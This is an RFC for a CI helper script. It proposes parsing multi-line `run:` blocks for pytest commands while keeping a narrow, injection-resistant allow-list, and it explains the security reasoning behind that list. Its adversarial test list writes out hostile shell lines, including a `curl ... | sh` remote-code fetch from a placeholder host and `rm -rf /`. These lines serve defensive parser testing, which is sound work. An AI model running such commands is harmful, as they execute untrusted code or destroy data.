# RFC: safe_pytest_command.py must discover multi-line `run:` blocks

## Status

Proposed. Companion code change and adversarial tests are in the same PR
(this is a bounded, fully-tested bug fix, not a staged feature — the
project's usual "contracts PR before production PR" staging is for new
multi-PR feature work, not a single narrow correctness fix with its
security reasoning written down and adversarial tests attached).

## Problem

`scripts/ci/safe_pytest_command.py` (`discover_commands`) is how
`opencode-review-dispatch.yml`'s `coverage-evidence` job tries to reuse a
repository's own configured pytest invocation instead of guessing one. It is
consumed by `configured_python_ci_test_commands()` in
`opencode-review-dispatch.yml`, whose result gates whether `opencode-agent`
can APPROVE a pull request at all.

Verified against `ContextualWisdomLab/contextual-orchestrator` PR #96
(`fix/atheris-interpreter-lock`, head `c7d72824e5ecfc1086dfaad893709fede3175f27`)
by reproducing the exact pinned sandbox image
(`python:3.14-slim@sha256:b877e50bd90de10af8d82c57a022fc2e0dc731c5320d762a27986facfc3355c1`)
and running that PR's own real commands against its own real tree: 583/583
tests pass, 100% branch coverage, 100% docstring coverage (`interrogate`).
Despite this, `opencode-agent` has posted `REQUEST_CHANGES`/`CHANGES_REQUESTED`
citing failing coverage evidence across at least six different head SHAs
between 2026-08-05 and 2026-08-12 — a week of false negatives, not a flake.

Root cause, in `discover_commands`:

```python
RUN_LINE_RE = re.compile(r"\s*(?:-\s*)?run:\s*(.+?)\s*$")
...
for path in sorted(workflow_dir.glob("ci.y*ml")):
    for line in path.read_text(...).splitlines():
        match = RUN_LINE_RE.fullmatch(line)
        ...
```

This only recognizes a **single-line** `run: <command>` step. GitHub Actions'
other extremely common form — a block scalar —

```yaml
- name: Run full test suite
  run: |
    python -m coverage erase
    python -m coverage run --branch -m pytest -q
    python -m coverage report --fail-under=100
    interrogate --fail-under 100 contextual_orchestrator
```

is invisible to it: the regex matches the `run: |` header line and captures
just the literal string `|`, which correctly fails `_is_pytest_argv` and is
silently dropped. `discover_commands` returns an empty list, so
`configured_python_ci_test_commands()` is empty, and the pipeline falls back
to a generic `coverage run -m pytest tests && coverage report --show-missing`
path that never runs `interrogate` — and separately,
`run_python_docstring_coverage()` only recognizes docstring evidence via a
literal `tests/test_docstrings.py` pytest file, which does not exist here
(this repository gates docstrings with the `interrogate` CLI directly, not a
pytest wrapper). Either gap is independently sufficient to explain the
persistent "test/docstring evidence not proven" verdict.

A second, narrower gap compounds it: even a repository using `ci.yml` with a
block scalar containing exactly one pytest-shaped line would still miss,
because `_is_pytest_argv` requires an **exact** positional match —
`argv[1:4] == ["run", "-m", "pytest"]` for the `coverage` executable — so
`coverage run --branch -m pytest -q` (the `--branch` flag lands between
`run` and `-m`) does not match either.

## Security context — why this file's grammar is deliberately narrow

`configured_python_ci_test_commands()` feeds this script content from the
**pull request's own, author-controlled workflow file**, materialized inside
`COVERAGE_SOURCE_WORKDIR` before the coverage-evidence sandbox runs it. That
makes `discover_commands`'s input untrusted by construction. The existing
design responds to that correctly: `_has_shell_control` rejects any argv
token containing `;&|<>` `` ` `` or `$(`, and `_is_pytest_argv` only accepts
`pytest`/`py.test`, `python[3] -m pytest`, or `coverage run -m pytest`
invocations. `execute_command` then runs the validated argv with
`subprocess.run(..., shell=False)` — there is no shell to inject into, so
the practical purpose of these two checks is narrower than "prevent shell
injection": it is "guarantee the discovered command can only ever *run this
repository's own pytest suite*, nothing else, regardless of what a PR author
writes in its own workflow file." That guarantee must survive this change
unmodified.

It is also worth being explicit about what this check does **not** need to
defend against, so reviewers don't over-credit it: once `pytest`/`coverage`
runs, it inherently executes the PR's own test files and `conftest.py` as
Python — that is the intended purpose of running the suite at all, and the
real containment for that is the sandbox (`--network=none`, dropped
capabilities, `--pids-limit`, `--memory`/`--cpus` bounds, read-only trusted
mount for everything except the PR's own materialized tree). A malicious PR
could already, today, ship a `.coveragerc`/`pyproject.toml [tool.coverage]`
`plugins =` directive to load arbitrary code the moment *any* accepted
`coverage run` invocation executes — that risk is orthogonal to, and
predates, this change; it is not created or worsened by loosening how
liberally we match flags around `-m pytest`.

## Proposed change

Two independent, individually-testable adjustments to
`scripts/ci/safe_pytest_command.py`. Neither changes what `execute_command`
is allowed to run — only which candidate lines get a chance to pass the
existing, unmodified `parse_safe_pytest_command` gate.

### 1. Offer every line of a `run: |`/`run: >` block as its own candidate

Add `_iter_run_command_lines(text)`, replacing the single-regex scan in
`discover_commands`. For a block-scalar `run:` step (header line matches
`run:\s*[|>][+-]?\s*(?:#.*)?$`, i.e. nothing but a block indicator and
optionally a comment after `run:`), every subsequent line indented **more**
than the `run:` key is offered, one at a time, to
`parse_safe_pytest_command` — the identical function used for single-line
`run:` today. Lines that do not independently parse as a safe pytest
invocation (e.g. `python -m coverage report --fail-under=100`,
`interrogate --fail-under 100 contextual_orchestrator`) are simply not
collected — never executed, never given special treatment — exactly as an
unrecognized single-line `run:` command is ignored today. The block is
never accepted or rejected as a unit; each line stands alone under the same
rule that already governs every line in the file.

### 2. Tolerate flags around `-m pytest`

Replace the exact positional check with a "recognized runner, then `-m`
`pytest` appears as a contiguous pair somewhere in its own argv" check:

```python
def _contains_module_invocation(argv: Sequence[str], start: int, module: str) -> bool:
    """Return whether ``-m module`` appears as a contiguous pair from ``start``."""
    return any(
        argv[index] == "-m" and argv[index + 1] == module
        for index in range(start, len(argv) - 1)
    )
```

`python[3] <flags> -m pytest <flags>` and `coverage run <flags> -m pytest
<flags>` are now recognized; the executable and the presence of `run`
immediately after `coverage` are still required exactly as before. The set
of things this can ever cause `execute_command` to run is unchanged:
`pytest`, `python -m pytest`, or `coverage run -m pytest` — with different
flags, never a different program.

## Adversarial test cases (must all still fail to discover)

- `run: pytest; curl http://x/y | sh` — semicolon rejected by
  `_has_shell_control` (unchanged).
- `run: |` block containing a line
  `python -m pytest && curl http://x/y | sh` — `&&`/`|` rejected per line.
- `run: |` block containing `rm -rf /` alongside a genuine
  `coverage run -m pytest -q` line on another line — the `rm -rf /` line is
  simply never offered to `_is_pytest_argv`'s recognized-executable check
  (`rm` is not `pytest`/`python`/`coverage`) and is never added to the
  discovered set; only the `coverage run -m pytest -q` line is discovered
  and only *that* argv is ever executed.
- `run: coverage run -m sneaky_module` — no `pytest` token adjacent to
  `-m`; rejected.
- `run: python3 -m pytest -p some.arbitrary.plugin` — still discovered
  (same as today's behavior for a single-line command with any pytest
  flag): pytest plugin flags were already reachable before this change for
  any repository whose single-line `run: pytest ...` included them, so this
  is not a new capability introduced here.
- A block scalar `run: >` (folded style) with a folded-then-unfolded single
  logical line spanning two physical lines — each physical line is offered
  independently; a command split across a fold is not reassembled and so is
  not discovered (fail-closed on the ambiguous case rather than guess).

## Rollout

This is an org-central script; the fix here does not, by itself, change any
consuming repository. `contextual-orchestrator`'s `.github/workflows/tests.yml`
still needs a follow-up rename to `.github/workflows/ci.yml` (confirmed the
established convention via `fast-mlsirm`'s `ci.yml`) before it benefits —
tracked as a separate, small, repo-side follow-up once this lands, since
renaming before this parser fix merges would have no effect (proven: reverted
a test-only rename this cycle after confirming the multi-line gap was the
actual blocker, not the filename alone).

## References

Reproduction evidence and full investigation trail: see this session's goal
log (contextual-orchestrator autonomous ecosystem loop, 2026-08-13 cycle 4/5).
